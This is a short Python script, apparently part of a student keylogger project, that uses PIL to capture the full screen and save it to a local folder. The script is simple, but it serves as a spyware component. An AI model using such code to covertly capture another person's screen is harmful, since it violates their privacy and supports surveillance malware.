from PIL import ImageGrab



file_path= "D:\\CYBERSECURITY PROJECT(KEYLOGGER)\\project"

extend="\\" 

screenshort_information="screenshots.png"

def screenshots():
  im=ImageGrab.grab()
  im.save(file_path + extend+ screenshort_information)


screenshots()